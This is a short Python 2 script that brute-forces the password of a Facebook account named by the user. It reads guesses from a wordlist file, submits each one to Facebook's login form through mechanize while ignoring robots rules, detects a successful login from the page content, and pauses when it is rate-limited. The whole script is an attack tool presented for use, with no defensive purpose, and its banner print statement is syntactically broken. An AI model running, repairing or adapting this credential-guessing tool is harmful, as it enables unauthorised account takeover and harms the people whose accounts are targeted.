import time
import sys

if sys.version_info[0] !=2: 
	print('''--------------------------------------
	REQUIRED PYTHON 2.x
	use: python Target.py
--------------------------------------
			''')
	sys.exit()

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
	import mechanize
	import urllib2
	browser = mechanize.Browser()
	browser.addheaders = [('User-Agent',headers['User-Agent'])]
	browser.set_handle_robots(False)
except:
	print('\n\tPlease install mechanize.\n')
	sys.exit()

print('
   \033[31;1m=/\                 /\=
   \033[31;1m/ \'._   (\_/)   _.'/ \
  \033[31;1m/ .''._'--(o.o)--'_.''. \
 \033[31;1m/.' _/ |`'=/ " \='`| \_ `.\
\033[31;1m/` .' `\;-,'\___/',-;/` '. '\
\033[31;/.-'        `\(-V-)/`       `-.\
`             "   "            " "')
file=open('passwords.txt','r')

email=str(raw_input('Enter Email/Username : ').strip())

print "\nTarget ID/NO : ",email
print "\nMENCOBAH KE AMANA AKUN/ATTACK LIST ..."

i=0
while file:
	passw=file.readline().strip()
	i+=1
	if len(passw) < 6:
		continue
	print str(i) +" : ",passw
	response = browser.open(post_url)
	try:
		if response.code == 200:
			browser.select_form(nr=0)
			browser.form['email'] = email
			browser.form['pass'] = passw
			response = browser.submit()
			if 'Find Friends' in response.read():
				print('Your password is : ',passw)
				break
	except:
		print('\nSleeping for time : 5 min\n')
		time.sleep(300)
